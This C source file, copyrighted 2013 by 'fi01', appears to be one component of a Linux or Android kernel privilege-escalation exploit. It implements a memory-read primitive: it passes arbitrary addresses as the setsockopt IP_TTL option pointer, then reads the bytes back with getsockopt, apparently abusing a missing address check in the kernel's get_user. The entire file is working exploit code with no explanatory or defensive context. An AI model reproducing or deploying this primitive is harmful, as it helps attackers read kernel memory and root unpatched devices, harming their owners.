/*
 *  Copyright (c) 2013 by fi01
 */

#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <errno.h>
#include "get_user.h"

static bool
ipsock_read_value_at_address(unsigned long address, int *value)
{
  unsigned int addr;
  unsigned char *data = (void *)value;
  int sock;
  int i;

  *value = 0;
  errno = 0;

  if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
    printf("error in socket().\n");
    return false;
  }

  for (i = 0; i < sizeof (*value); i++, address++, data++) {
    if (setsockopt(sock, SOL_IP, IP_TTL, (void *)address, 1) != 0) {
      if (errno != EINVAL) {
	printf("error in setsockopt().\n");
	*value = 0;
	return false;
      }
    }
    else {
      socklen_t optlen = 1;
      if (getsockopt(sock, SOL_IP, IP_TTL, data, &optlen) != 0) {
	printf("error in getsockopt().\n");
	*value = 0;
	return false;
      }
    }
  }

  close(sock);

  return true;
}

bool
get_user_read_value_at_address(unsigned long address, int *value)
{
  return ipsock_read_value_at_address(address, value);
}
